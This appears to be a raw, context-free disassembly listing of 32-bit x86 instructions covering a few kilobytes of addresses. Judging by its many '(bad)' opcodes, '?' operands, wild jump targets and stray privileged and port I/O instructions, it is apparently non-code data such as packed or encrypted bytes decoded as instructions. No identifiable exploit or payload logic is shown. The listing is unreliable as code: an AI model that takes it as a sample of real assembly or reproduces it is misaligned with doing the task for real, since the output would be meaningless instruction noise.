  41cc0f:	xchg   BYTE PTR fs:[esi+0x393f033e],bh
  41cc16:	pop    esp
  41cc17:	mov    DWORD PTR [edx+0x6991f660],edi
  41cc1d:	es adc cl,ch
  41cc20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc21:	dec    ebx
  41cc22:	push   ds
  41cc23:	gs scas eax,DWORD PTR es:[edi]
  41cc25:	or     ebp,esi
  41cc27:	jmp    0xea5c553c
  41cc2c:	add    al,0x31
  41cc2e:	cdq    
  41cc2f:	jmp    0x3dd37ec7
  41cc34:	pop    es
  41cc35:	cmp    DWORD PTR [ecx+esi*8+0x59],ebx
  41cc39:	mov    cl,0x3e
  41cc3b:	shr    edi,cl
  41cc3d:	imul   esi,esi,0xee0c6a7c
  41cc43:	rol    DWORD PTR fs:[eax+0x7463],cl
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	add    BYTE PTR [esi-0x34536442],ah
  41cc52:	adc    ebp,DWORD PTR [ebx-0x14]
  41cc55:	xchg   ebx,eax
  41cc56:	mov    dl,0x93
  41cc58:	sub    DWORD PTR [esi-0x6c],ecx
  41cc5b:	js     0x41cc5d
  41cc5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc5e:	test   BYTE PTR [eax-0x10],al
  41cc61:	lock out 0xe,eax
  41cc64:	or     edi,DWORD PTR [eax-0xb72a251]
  41cc6a:	add    ebx,DWORD PTR [esi-0x73]
  41cc6d:	fs inc esi
  41cc6f:	pop    esi
  41cc70:	lea    edi,[esi+edx*2-0x49f5070a]
  41cc77:	push   cs
  41cc78:	mov    esp,DWORD PTR [ecx+0x39]
  41cc7b:	jmp    0x41ccf1
  41cc7d:	data16 cmp al,0x61
  41cc80:	or     al,0xf4
  41cc82:	dec    eax
  41cc83:	imul   eax,DWORD PTR [edx+ebp*2],0xfffffff0
  41cc87:	push   ds
  41cc88:	not    bl
  41cc8a:	mov    ecx,0x6d1d5599
  41cc8f:	not    dh
  41cc91:	inc    ebx
  41cc92:	mov    dh,0xe
  41cc94:	push   ecx
  41cc95:	lods   al,BYTE PTR ds:[esi]
  41cc96:	jns    0x41ccb2
  41cc98:	push   eax
  41cc99:	fdivr  QWORD PTR [ecx-0x26]
  41cc9c:	push   eax
  41cc9d:	mov    esp,0xe2e8ee61
  41cca2:	and    ch,ch
  41cca4:	push   DWORD PTR [esi+esi*8+0x61b20761]
  41ccab:	sbb    al,BYTE PTR [ebp+0x33126f60]
  41ccb1:	add    BYTE PTR [eax],al
  41ccb3:	add    BYTE PTR [eax],al
  41ccb5:	add    BYTE PTR [ecx+0x4951d503],bh
  41ccbb:	imul   eax,DWORD PTR [ebx+0x51],0xbf5fb72
  41ccc2:	jmp    0xfc2cdb75
  41ccc7:	add    al,0xae
  41ccc9:	pop    edi
  41ccca:	jmp    FWORD PTR [ebx-0x2b]
  41cccd:	ret    0xaef1
  41ccd0:	aas    
  41ccd1:	push   ebp
  41ccd2:	pop    ss
  41ccd3:	push   0xaad57c97
  41ccd8:	xchg   edi,eax
  41ccd9:	icebp  
  41ccda:	nop
  41ccdb:	sahf   
  41ccdc:	sar    DWORD PTR [ebp-0x67],1
  41ccdf:	nop
  41cce0:	ds and al,0x98
  41cce3:	or     cl,0xe7
  41cce6:	xlat   BYTE PTR ds:[ebx]
  41cce7:	adc    al,0xd1
  41cce9:	cld    
  41ccea:	sbb    DWORD PTR [ebx-0x6],ebx
  41cced:	xchg   BYTE PTR [esi],bl
  41ccef:	dec    ebp
  41ccf0:	xchg   edi,eax
  41ccf1:	mov    edi,0xbfe41d1d
  41ccf6:	jnp    0x41ccbf
  41ccf8:	popf   
  41ccf9:	jnp    0x41cca7
  41ccfb:	mov    bh,0x97
  41ccfd:	cld    
  41ccfe:	(bad)  
  41ccff:	(bad)  
  41cd00:	pushf  
  41cd01:	dec    ebx
  41cd02:	lods   al,BYTE PTR ds:[esi]
  41cd03:	mov    ebx,0x3278d49d
  41cd08:	push   ss
  41cd09:	std    
  41cd0a:	addr16 xchg ebx,eax
  41cd0c:	push   edi
  41cd0d:	xor    BYTE PTR [ecx],cl
  41cd0f:	(bad)  
  41cd11:	adc    BYTE PTR [eax-0x58],0xf1
  41cd15:	xor    BYTE PTR [edi+0x13],cl
  41cd18:	push   eax
  41cd19:	dec    eax
  41cd1a:	add    BYTE PTR [eax],al
  41cd1c:	add    BYTE PTR [eax],al
  41cd1e:	add    BYTE PTR [esi+0xbdc9ce8],bh
  41cd24:	or     dl,BYTE PTR [esi+0x1]
  41cd27:	sub    eax,DWORD PTR [ebp+0x17a5fcbf]
  41cd2d:	shl    DWORD PTR [edx-0x68],1
  41cd30:	mov    ch,0x1a
  41cd32:	call   0xfd13029e
  41cd37:	or     al,0xdc
  41cd39:	es adc al,0x1b
  41cd3c:	xlat   BYTE PTR ds:[ebx]
  41cd3d:	mov    ecx,0xd060f200
  41cd42:	mov    cl,BYTE PTR [esi+0x5b]
  41cd45:	dec    ecx
  41cd46:	mov    DWORD PTR [ecx+0x5f044170],edx
  41cd4c:	pushf  
  41cd4d:	mov    esp,0xd49c4f17
  41cd52:	pop    ss
  41cd53:	fwait
  41cd54:	pop    ecx
  41cd55:	pop    edx
  41cd56:	jb     0x41cd23
  41cd58:	mov    dl,0x47
  41cd5a:	add    al,0x6d
  41cd5c:	push   0x9ed25eaa
  41cd61:	neg    DWORD PTR [eax+0x9]
  41cd64:	pop    ss
  41cd65:	jns    0x41cd16
  41cd67:	lahf   
  41cd68:	gs pusha 
  41cd6a:	pusha  
  41cd6b:	and    BYTE PTR [eax-0x7c],0x8e
  41cd6f:	sub    bh,BYTE PTR [edx-0x76e94b90]
  41cd75:	lahf   
  41cd76:	mov    BYTE PTR [eax-0x6f360782],bh
  41cd7c:	mov    dl,0x72
  41cd7e:	rcl    DWORD PTR [esi+ebp*1+0x477],0x0
  41cd86:	add    BYTE PTR [eax],al
  41cd88:	nop
  41cd89:	mov    dl,0xdc
  41cd8b:	cmp    DWORD PTR [edi+esi*1+0xa77b023],eax
  41cd92:	add    BYTE PTR [eax+edx*4],0x3d
  41cd96:	push   cs
  41cd97:	clc    
  41cd98:	or     bl,dh
  41cd9a:	jo     0x41cdee
  41cd9c:	mov    al,ds:0x902e2c62
  41cda1:	sbb    ah,BYTE PTR [edx]
  41cda3:	addr16 inc esi
  41cda5:	or     DWORD PTR [esp+eax*8-0x3d],edi
  41cda9:	mov    esi,0x3d24474a
  41cdae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdaf:	mov    edx,ebp
  41cdb1:	retf   0x637f
  41cdb4:	and    cl,BYTE PTR [ecx]
  41cdb6:	gs mov bh,bl
  41cdb9:	jge    0x41cd92
  41cdbb:	xchg   BYTE PTR [eax],bh
  41cdbd:	jle    0x41cdb7
  41cdbf:	leave  
  41cdc0:	nop
  41cdc1:	mov    bl,0x60
  41cdc3:	shr    edi,1
  41cdc5:	loop   0x41cd55
  41cdc7:	add    al,0x90
  41cdc9:	cmp    eax,0x7808f7a6
  41cdce:	out    0x58,eax
  41cdd0:	sbb    ebp,DWORD PTR [edi+0x5b]
  41cdd3:	push   esp
  41cdd4:	jp     0x41cd89
  41cdd6:	push   cs
  41cdd7:	inc    ecx
  41cdd8:	xchg   DWORD PTR [ebp+0x10],edx
  41cddb:	jmp    0x726854ea
  41cde0:	pop    edi
  41cde1:	mov    dh,0x93
  41cde3:	xor    BYTE PTR [eax-0x10536658],cl
  41cde9:	das    
  41cdea:	adc    BYTE PTR [edx+0x0],ah
  41cded:	add    BYTE PTR [eax],al
  41cdef:	add    BYTE PTR [eax],al
  41cdf1:	dec    edi
  41cdf2:	add    bl,BYTE PTR [eax+0x543b97a8]
  41cdf8:	cmc    
  41cdf9:	sbb    cl,al
  41cdfb:	push   ss
  41cdfc:	mov    edx,0xf95ba7ca
  41ce01:	mov    dl,0x7b
  41ce03:	loop   0x41ce75
  41ce05:	ficom  WORD PTR [esi]
  41ce07:	cli    
  41ce08:	jmp    0xe899:0xc1fa7d14
  41ce0f:	push   cs
  41ce10:	jmp    0xe9685c21
  41ce15:	lock push 0xefc4e89e
  41ce1b:	shl    ch,1
  41ce1d:	xchg   ebx,eax
  41ce1e:	cmp    DWORD PTR [eax+0x9],eax
  41ce21:	pop    ebp
  41ce22:	dec    eax
  41ce23:	xchg   esp,eax
  41ce24:	mov    ebx,0x3099a487
  41ce29:	cmp    BYTE PTR ds:0x908d1dd8,dh
  41ce2f:	daa    
  41ce30:	jmp    0x41ceb1
  41ce32:	mov    al,0x74
  41ce34:	rcl    BYTE PTR [edx+0x4d290f7e],0x89
  41ce3b:	addr16 aad 0x93
  41ce3e:	mov    dl,0xfe
  41ce40:	call   0xdf872f01
  41ce45:	xchg   edi,eax
  41ce46:	ror    esi,0x52
  41ce49:	mov    ebx,0x93e9761a
  41ce4e:	mov    dl,0x93
  41ce50:	sub    DWORD PTR [esi+0x9966],edi
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	add    BYTE PTR [eax],al
  41ce5a:	cmp    BYTE PTR [eax+0x1f],bh
  41ce5d:	shr    BYTE PTR [ebx+esi*8+0x61],cl
  41ce61:	add    eax,0x7f1263e0
  41ce66:	div    DWORD PTR [ebx]
  41ce68:	gs cmp al,0xbb
  41ce6b:	mov    edi,0xabf082fe
  41ce70:	in     eax,dx
  41ce71:	je     0x41ce26
  41ce73:	or     al,0x5d
  41ce75:	sbb    al,0x1f
  41ce77:	mov    cl,0x1f
  41ce79:	sar    cl,0x56
  41ce7c:	daa    
  41ce7d:	mov    esi,eax
  41ce7f:	jnp    0x41ce12
  41ce81:	fistp  DWORD PTR ds:0xed4196fb
  41ce87:	cs scas al,BYTE PTR es:[edi]
  41ce89:	or     BYTE PTR [edx],al
  41ce8b:	ja     0x41ce9f
  41ce8d:	mov    ebp,DWORD PTR [ecx-0x5874fea5]
  41ce93:	xor    ebp,ebx
  41ce95:	or     al,0xdb
  41ce97:	mov    ds:0xb7aef927,eax
  41ce9c:	in     al,0x46
  41ce9e:	ins    DWORD PTR es:[edi],dx
  41ce9f:	scas   eax,DWORD PTR es:[edi]
  41cea0:	popa   
  41cea1:	(bad)  
  41cea2:	xchg   edx,eax
  41cea3:	test   DWORD PTR [esi],0x1a45eaf7
  41cea9:	jae    0x41ceca
  41ceab:	je     0x41ce3c
  41cead:	rcl    BYTE PTR [ecx-0x18d40f5],0x5a
  41ceb4:	sub    DWORD PTR [edx+0x2b],0x6b
  41ceb8:	dec    ebx
  41ceb9:	pop    esi
  41ceba:	jb     0x41ceaf
  41cebc:	mov    ?,WORD PTR [ecx+0x0]
  41cebf:	add    BYTE PTR [eax],al
  41cec1:	add    BYTE PTR [eax],al
  41cec3:	popa   
  41cec4:	lods   eax,DWORD PTR ds:[esi]
  41cec5:	popa   
  41cec6:	pop    es
  41cec7:	mov    dl,0x6d
  41cec9:	push   edx
  41ceca:	mov    ebp,DWORD PTR [ecx-0x46]
  41cecd:	iret   
  41cece:	xor    edi,DWORD PTR [ecx+0x558b40f3]
  41ced4:	xor    edi,edx
  41ced6:	and    al,0x90
  41ced8:	xchg   esp,eax
  41ced9:	push   edi
  41ceda:	or     BYTE PTR [ecx],cl
  41cedc:	dec    esi
  41cedd:	mov    edx,0x9afd5588
  41cee2:	inc    edx
  41cee3:	hlt    
  41cee4:	adc    DWORD PTR [edi+0x10],0x9
  41cee8:	dec    esi
  41cee9:	mov    dl,0x80
  41ceeb:	enter  0x7f19,0x4a
  41ceef:	in     al,dx
  41cef0:	ss aad 0x42
  41cef3:	in     al,0xfb
  41cef5:	test   DWORD PTR [esi+0x429bb565],0xbcab0b8
  41ceff:	scas   eax,DWORD PTR es:[edi]
  41cf00:	scas   eax,DWORD PTR es:[edi]
  41cf01:	fcmovnb st,st(1)
  41cf03:	xchg   esp,eax
  41cf04:	sbb    DWORD PTR [ecx+ecx*4-0x5f],eax
  41cf08:	daa    
  41cf09:	cdq    
  41cf0a:	push   ebp
  41cf0b:	mov    BYTE PTR [ebx+0x39],bl
  41cf0e:	shr    BYTE PTR [eax+0x78045b7e],cl
  41cf14:	and    cl,dh
  41cf16:	(bad)  
  41cf17:	jg     0x41ceb1
  41cf19:	shl    DWORD PTR [edx-0x73],1
  41cf1c:	cwde   
  41cf1d:	frndint 
  41cf1f:	jnp    0x41cec4
  41cf21:	xchg   ecx,eax
  41cf22:	jnp    0x41ced0
  41cf24:	pop    ss
  41cf25:	adc    dh,BYTE PTR [eax+eax*1+0x0]
  41cf29:	add    BYTE PTR [eax],al
  41cf2b:	add    BYTE PTR [ecx-0x70],bh
  41cf2e:	push   ebx
  41cf2f:	or     bl,ch
  41cf31:	pop    ebx
  41cf32:	or     al,BYTE PTR [ecx]
  41cf34:	(bad)  
  41cf35:	pop    ss
  41cf36:	cmp    BYTE PTR [eax],bl
  41cf38:	inc    edi
  41cf39:	mov    al,ds:0x1ce00ff6
  41cf3e:	pop    es
  41cf3f:	pop    esp
  41cf40:	sahf   
  41cf41:	fist   DWORD PTR [edx]
  41cf43:	adc    DWORD PTR [eax+eax*1-0x67],0x59969845
  41cf4b:	dec    DWORD PTR [eax]
  41cf4d:	into   
  41cf4e:	sbb    bl,BYTE PTR [ebp-0x4a]
  41cf51:	pop    ecx
  41cf52:	push   ss
  41cf53:	add    BYTE PTR [esi-0x4e],ah
  41cf56:	pusha  
  41cf57:	mov    ah,0x18
  41cf59:	ja     0x41cf6e
  41cf5b:	or     al,0x9
  41cf5d:	ins    DWORD PTR es:[edi],dx
  41cf5e:	out    dx,eax
  41cf5f:	sub    cl,bh
  41cf61:	stos   BYTE PTR es:[edi],al
  41cf62:	rol    bl,1
  41cf64:	xchg   DWORD PTR [ebp+0x62],ebx
  41cf67:	cmp    eax,0x2fcb18c
  41cf6c:	xchg   ebp,eax
  41cf6d:	leave  
  41cf6e:	hlt    
  41cf6f:	xor    DWORD PTR [ecx-0x57abb59e],ecx
  41cf75:	sbb    ch,BYTE PTR ds:0x105c7e0
  41cf7b:	add    DWORD PTR [edx+0x43c37bf2],eax
  41cf81:	mov    ds:0x39984d1c,al
  41cf86:	mov    cs,WORD PTR [ebx]
  41cf88:	cmp    eax,esp
  41cf8a:	out    dx,eax
  41cf8b:	mov    cl,ah
  41cf8d:	sbb    ch,BYTE PTR [esi+0xdf]
  41cf93:	add    BYTE PTR [eax],al
  41cf95:	xchg   edi,eax
  41cf96:	add    eax,0xae525d9d
  41cf9b:	test   DWORD PTR [eax-0x70c311d],0xe48bace
  41cfa5:	packsswb mm5,mm7
  41cfa8:	sub    BYTE PTR [edx-0x56],al
  41cfab:	js     0x41cf70
  41cfad:	xchg   ebx,eax
  41cfae:	sbb    dh,dl
  41cfb0:	fistp  WORD PTR [edi+0x5]
  41cfb3:	mov    edx,0x705c9008
  41cfb8:	mov    bl,0xe4
  41cfba:	cmp    DWORD PTR [esi],edi
  41cfbc:	or     al,0x1b
  41cfbe:	je     0x41cfb3
  41cfc0:	mov    fs,WORD PTR [ebx-0x6ffc03d1]
  41cfc6:	mov    dl,0x8f
  41cfc8:	add    ecx,DWORD PTR [edx+esi*4-0x9]
  41cfcc:	xchg   edi,esp
  41cfce:	jle    0x41cfc2
  41cfd0:	adc    BYTE PTR [edi+0x5],0xf
  41cfd4:	sub    BYTE PTR [ebx],0x32
  41cfd7:	imul   eax,ebp,0xffffff9f
  41cfda:	mov    dl,0x62
  41cfdc:	add    BYTE PTR [ecx],bl
  41cfde:	ja     0x41cff6
  41cfe0:	jb     0x41d038
  41cfe2:	scas   al,BYTE PTR es:[edi]
  41cfe3:	js     0x41cfd2
  41cfe5:	xor    al,0x81
  41cfe7:	xor    bh,cl
  41cfe9:	push   ds
  41cfea:	mov    cl,0x96
  41cfec:	cdq    
  41cfed:	and    al,0xa0
  41cfef:	dec    edx
  41cff0:	xlat   BYTE PTR ds:[ebx]
  41cff1:	push   ebx
  41cff2:	mov    dl,0x91
  41cff4:	sub    eax,0xe1553b80
  41cff9:	add    BYTE PTR [eax],al
  41cffb:	add    BYTE PTR [eax],al
  41cffd:	add    BYTE PTR [esi],bl
  41cfff:	ins    DWORD PTR es:[edi],dx
  41d000:	pshufw mm2,QWORD PTR [esi-0x46],0x4d
  41d005:	mov    edi,0xbf0eb0d1
  41d00a:	or     BYTE PTR [edi+ecx*4],dl
  41d00d:	iret   
  41d00e:	xchg   ebx,eax
  41d00f:	adc    DWORD PTR [esi],0xf6ba5672
  41d015:	sar    BYTE PTR [edi-0x2c4511fc],cl
  41d01b:	sub    al,0x15
  41d01d:	pusha  
  41d01e:	(bad)  
  41d01f:	scas   al,BYTE PTR es:[edi]
  41d020:	xchg   edi,eax
  41d021:	das    
  41d022:	xchg   esp,eax
  41d023:	sub    edx,DWORD PTR [ebp-0x13]
  41d026:	(bad)  
  41d028:	cdq    
  41d029:	cmp    BYTE PTR [eax-0x63ab3ed1],ah
  41d02f:	cmp    DWORD PTR [eax-0xf],edx
  41d032:	sbb    al,ch
  41d034:	sbb    dl,dl
  41d036:	imul   ecx,ebx,0xa3a1e13f
  41d03c:	cdq    
  41d03d:	sub    BYTE PTR [eax+0x48f14fb1],bl
  41d043:	hlt    
  41d044:	popa   
  41d045:	test   BYTE PTR [ecx],0xb2
  41d048:	push   eax
  41d049:	pusha  
  41d04a:	loop   0x41d002
  41d04c:	xchg   edx,eax
  41d04d:	test   eax,0x26fc66
  41d052:	cmp    edi,DWORD PTR [ebp-0x509472e7]
  41d058:	xchg   ebp,eax
  41d059:	inc    ecx
  41d05a:	sub    eax,0x7ac3ae03
  41d05f:	rcr    BYTE PTR [edx],1
  41d061:	add    BYTE PTR [eax],al
  41d063:	add    BYTE PTR [eax],al
  41d065:	add    BYTE PTR [eax],al
  41d067:	xor    BYTE PTR [eax+0x1a],0xc3
  41d06b:	cmp    bl,BYTE PTR [esi-0x69]
  41d06e:	icebp  
  41d06f:	imul   eax,DWORD PTR ds:0x1f673ee,0xb016e9ae
  41d079:	push   cs
  41d07a:	add    BYTE PTR [edi+ebx*2],al
  41d07d:	xchg   edi,eax
  41d07e:	jl     0x41d005
  41d080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d081:	xchg   ecx,eax
  41d082:	inc    DWORD PTR [eax]
  41d084:	mov    bh,0x97
  41d086:	ins    BYTE PTR es:[edi],dx
  41d087:	aad    0x9b
  41d089:	xchg   edi,eax
  41d08a:	int    0xa1
  41d08c:	lea    edx,[ecx+eax*1-0x1419c557]
  41d093:	mov    al,ds:0x8e85ae02
  41d098:	mov    dh,0x9c
  41d09a:	sub    BYTE PTR [ecx+0xd8b0eaf],0xc
  41d0a1:	add    al,BYTE PTR [eax+0x73ee173d]
  41d0a7:	out    0x6e,eax
  41d0a9:	daa    
  41d0aa:	(bad)  
  41d0ab:	fld    QWORD PTR [ecx-0x6f]
  41d0ae:	(bad)  
  41d0af:	(bad)  
  41d0b1:	cdq    
  41d0b2:	pop    esi
  41d0b3:	jno    0x41d0e1
  41d0b5:	daa    
  41d0b6:	add    BYTE PTR [edi+eiz*4+0x576b4f99],ah
  41d0bd:	pusha  
  41d0be:	fld    TBYTE PTR [ecx-0x51]
  41d0c1:	xchg   ebp,eax
  41d0c2:	add    esi,DWORD PTR [esi+ebp*8+0x61865761]
  41d0c9:	inc    DWORD PTR ds:[eax]
  41d0cc:	add    BYTE PTR [eax],al
  41d0ce:	add    BYTE PTR [eax],al
  41d0d0:	inc    esp
  41d0d1:	pop    ebx
  41d0d2:	add    al,0x40
  41d0d4:	nop
  41d0d5:	sbb    DWORD PTR [ebp+0x28929cc3],edx
  41d0db:	add    al,0x3b
  41d0dd:	fistp  WORD PTR [ebp+eax*2-0x75227f6c]
  41d0e4:	rcr    BYTE PTR [edx],0x15
  41d0e7:	aad    0xf8
  41d0e9:	jo     0x41d0b7
  41d0eb:	inc    DWORD PTR [edi]
  41d0ed:	xchg   ebp,eax
  41d0ee:	shl    BYTE PTR [ebx-0x3d],cl
  41d0f1:	adc    BYTE PTR ds:0x151546fd,0x46
  41d0f8:	xchg   esp,eax
  41d0f9:	cmp    al,0x3f
  41d0fb:	push   eax
  41d0fc:	out    0xe5,eax
  41d0fe:	inc    ebp
  41d0ff:	push   ss
  41d100:	push   eax
  41d101:	sbb    DWORD PTR [ebp+0x281a84c3],edx
  41d107:	add    al,0x1b
  41d109:	and    ebp,esi
  41d10b:	mov    BYTE PTR [ebx-0x4000f12d],dl
  41d111:	mov    ds:0x4b0b0450,eax
  41d116:	out    dx,al
  41d117:	mov    BYTE PTR [ebx-0x5800f135],dl
  41d11d:	stos   DWORD PTR es:[edi],eax
  41d11e:	push   eax
  41d11f:	add    al,0xe0
  41d121:	sbb    DWORD PTR [ebp+0x49d96201],edi
  41d127:	pop    ebx
  41d128:	out    dx,al
  41d129:	and    al,0xd4
  41d12b:	pop    es
  41d12c:	nop
  41d12d:	gs push ss
  41d12f:	push   0x4eb448
  41d134:	add    BYTE PTR [eax],al
  41d136:	add    BYTE PTR [eax],al
  41d138:	add    BYTE PTR [eax+0x14],ch
  41d13b:	cmp    eax,0xda969002
  41d140:	jae    0x41d0ec
  41d142:	mov    WORD PTR [ebx-0x1af921ff],gs
  41d148:	mov    edi,0x86a6cf09
  41d14d:	aad    0xf7
  41d14f:	in     al,dx
  41d150:	rol    ebp,0xb2
  41d153:	fiadd  DWORD PTR [ebx+0x30f7aa7b]
  41d159:	mov    ds:0x2f0c0432,eax
  41d15e:	add    al,BYTE PTR [ebx]
  41d160:	or     dl,BYTE PTR [ecx]
  41d162:	repz stc 
  41d164:	(bad)  
  41d165:	push   ecx
  41d166:	mov    dl,0x43
  41d168:	ret    
  41d169:	adc    BYTE PTR [eax+0x63],dh
  41d16c:	mov    edx,0xaf37a2f8
  41d171:	call   0xd185093b
  41d176:	sub    eax,0x7010abd3
  41d17b:	inc    ebx
  41d17c:	mov    edx,0xb94ff2a1
  41d181:	jns    0x41d137
  41d183:	test   esi,0x5088634e
  41d189:	or     esp,ebx
  41d18b:	lea    edx,[edx+0x17]
  41d18e:	adc    edx,DWORD PTR [bx+si]
  41d191:	adc    ebx,esi
  41d193:	mov    ebp,DWORD PTR [edi]
  41d195:	or     ch,BYTE PTR [esi-0x6fbc338d]
  41d19b:	enter  0xc3,0x0
  41d19f:	add    BYTE PTR [eax],al
  41d1a1:	add    BYTE PTR [esi],dl
  41d1a3:	ja     0x41d178
  41d1a5:	adc    edx,DWORD PTR [eax]
  41d1a7:	cld    
  41d1a8:	ret    0x9730
  41d1ab:	mov    ecx,?
  41d1ad:	pop    ebx
  41d1ae:	emms   
  41d1b0:	fist   DWORD PTR [ebx]
  41d1b2:	jns    0x41d16b
  41d1b4:	ja     0x41d172
  41d1b6:	mov    eax,0xa44f687
  41d1bb:	mov    ch,0x8
  41d1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1be:	shr    bl,0x3
  41d1c1:	hlt    
  41d1c2:	jmp    0x41d193
  41d1c4:	sbb    edi,ebx
  41d1c6:	in     al,0xd7
  41d1c8:	in     al,0x79
  41d1ca:	pop    ds
  41d1cb:	mov    edi,?
  41d1cd:	sub    eax,0xc10f358a
  41d1d2:	inc    esp
  41d1d3:	sub    BYTE PTR [eax+0x14],al
  41d1d6:	adc    eax,0xeca39a11
  41d1db:	inc    edx
  41d1dc:	js     0x41d1c9
  41d1de:	xchg   ebx,eax
  41d1df:	mov    bl,0xde
  41d1e1:	cli    
  41d1e2:	in     eax,dx
  41d1e3:	jno    0x41d17e
  41d1e5:	jg     0x41d1fd
  41d1e7:	mov    dl,0x99
  41d1e9:	mov    dh,0x18
  41d1eb:	shr    DWORD PTR [ebx-0x6a],1
  41d1ee:	add    eax,0x8fdd3265
  41d1f3:	inc    ecx
  41d1f4:	call   0x14ea:0x62b0f025
  41d1fb:	stc    
  41d1fc:	setno  BYTE PTR [esi-0x38a1ea7a]
  41d203:	xor    eax,eax
  41d205:	jmp    0x41d20a
  41d20a:	add    BYTE PTR [eax],ah
  41d20c:	call   0x6b4ce5a8
  41d211:	adc    dl,BYTE PTR [edx-0x7a]
  41d214:	xor    esi,DWORD PTR [ecx]
  41d216:	jmp    0xe954652f
  41d21b:	jne    0x41d1c7
  41d21d:	inc    esi
  41d21e:	(bad)  
  41d21f:	pop    ecx
  41d220:	pop    ebp
  41d221:	dec    ecx
  41d222:	rcr    BYTE PTR [edx-0xd],0x41
  41d226:	(bad)  
  41d227:	into   
  41d228:	xor    ebx,eax
  41d22a:	xchg   ebp,eax
  41d22b:	dec    edi
  41d22c:	sub    al,0x10
  41d22e:	ins    DWORD PTR es:[edi],dx
  41d22f:	aam    0x84
  41d231:	push   esp
  41d232:	xchg   edi,eax
  41d233:	pushf  
  41d234:	push   es
  41d235:	inc    esi
  41d236:	bound  ecx,QWORD PTR [edx-0x44]
  41d239:	cmp    esi,DWORD PTR [esi+eax*4-0x76]
  41d23d:	adc    BYTE PTR [esi+0x2d],al
  41d240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d241:	sub    dl,BYTE PTR [edx]
  41d243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d245:	stc    
  41d246:	out    0x67,al
  41d248:	leave  
  41d249:	ins    DWORD PTR es:[edi],dx
  41d24a:	sti    
  41d24b:	mov    ah,0x8
  41d24d:	sbb    DWORD PTR [eax],eax
  41d24f:	data16 jp 0x41d1ff
  41d252:	sub    DWORD PTR [edi],0xffffffe4
  41d255:	push   cs
  41d256:	lock js 0x41d289
  41d259:	in     eax,dx
  41d25a:	cmp    ecx,DWORD PTR [ecx-0x37]
  41d25d:	clc    
  41d25e:	test   cl,ch
  41d260:	iret   
  41d261:	jae    0xced9874d
  41d267:	mov    dl,0xe2
  41d269:	loop   0x41d244
  41d26b:	mov    ecx,0xf1055
  41d270:	add    BYTE PTR [eax],al
  41d272:	add    BYTE PTR [eax],al
  41d274:	ins    BYTE PTR es:[edi],dx
  41d275:	inc    ebx
  41d276:	xchg   edi,eax
  41d277:	(bad)  
  41d278:	jbe    0x41d2a5
  41d27a:	pop    ds
  41d27b:	pop    esi
  41d27c:	mov    ds:0xf9238ef5,al
  41d281:	int    0x16
  41d283:	pop    eax
  41d284:	shl    dh,cl
  41d286:	inc    eax
  41d287:	mov    eax,DWORD PTR [ebp+0x36]
  41d28a:	cli    
  41d28b:	sbb    al,0x74
  41d28d:	shl    dl,0x56
  41d290:	push   ds
  41d291:	into   
  41d292:	or     dl,BYTE PTR [eax+0x62]
  41d295:	cmp    eax,0x6966a43
  41d29a:	in     al,0xff
  41d29c:	in     al,dx
  41d29d:	scas   eax,DWORD PTR es:[edi]
  41d29e:	sbb    eax,0xad80b940
  41d2a3:	je     0x41d23b
  41d2a5:	xor    ebp,DWORD PTR [ecx-0xc]
  41d2a8:	test   eax,0xc000ea3
  41d2ad:	mov    ds:0xb48145e3,al
  41d2b2:	in     eax,dx
  41d2b3:	jmp    FWORD PTR [ecx+0x142b19d0]
  41d2b9:	pop    ds
  41d2ba:	and    eax,0x11c2897d
  41d2bf:	mov    edi,esp
  41d2c1:	inc    ebx
  41d2c2:	aaa    
  41d2c3:	not    esi
  41d2c5:	sub    edx,esp
  41d2c7:	pop    esi
  41d2c8:	inc    eax
  41d2c9:	repz mov gs,esp
  41d2cc:	nop
  41d2cd:	mov    cl,0x5c
  41d2cf:	push   ebp
  41d2d0:	sbb    esp,ebx
  41d2d2:	loope  0x41d2c9
  41d2d4:	push   0xfca627
  41d2d9:	add    BYTE PTR [eax],al
  41d2db:	add    BYTE PTR [eax],al
  41d2dd:	push   edi
  41d2de:	mov    WORD PTR [edx+0x18b9f1d],gs
  41d2e4:	inc    DWORD PTR [edi+0x9]
  41d2e7:	xchg   edi,eax
  41d2e8:	inc    ebx
  41d2e9:	je     0x41d2ec
  41d2eb:	inc    edx
  41d2ec:	push   0xffffffd0
  41d2ee:	mov    ds:0x28ba5504,eax
  41d2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2f4:	adc    al,BYTE PTR [edx+edi*8+0x49150051]
  41d2fb:	push   ss
  41d2fc:	test   BYTE PTR [ecx],bl
  41d2fe:	or     DWORD PTR [edx],edx
  41d300:	add    BYTE PTR [edx-0x14],bh
  41d303:	xchg   esi,eax
  41d304:	inc    ebx
  41d305:	lods   al,BYTE PTR ds:[esi]
  41d306:	fnstenv [edi]
  41d308:	nop
  41d309:	pusha  
  41d30a:	cwde   
  41d30b:	call   FWORD PTR [edi-0x62]
  41d30e:	dec    ecx
  41d30f:	adc    al,BYTE PTR [ecx+0x439714d4]
  41d315:	lods   al,BYTE PTR ds:[esi]
  41d316:	fstp   QWORD PTR [ebx+0x6a]
  41d319:	jle    0x41d334
  41d31b:	pop    ebp
  41d31c:	push   0xffffffd7
  41d31e:	mov    edi,0x49a117ff
  41d323:	adc    al,BYTE PTR [ebx-0x46922030]
  41d329:	nop
  41d32a:	or     DWORD PTR [edx],edx
  41d32c:	push   ecx
  41d32d:	pop    ebp
  41d32e:	mov    ?,WORD PTR [esi]
  41d330:	and    al,0x84
  41d332:	aas    
  41d333:	cdq    
  41d334:	ret    0xcf1b
  41d337:	inc    edx
  41d338:	jmp    0x810bdfa0
  41d33d:	ficom  WORD PTR [eax*4+0x0]
  41d345:	add    BYTE PTR [edi],ch
  41d347:	or     al,0x12
  41d349:	add    BYTE PTR [edx],bl
  41d34b:	pop    ds
  41d34c:	adc    al,BYTE PTR [eax+0x2fbeb379]
  41d352:	xchg   ebx,eax
  41d353:	xor    ch,bh
  41d355:	stos   DWORD PTR es:[edi],eax
  41d356:	loop   0x41d304
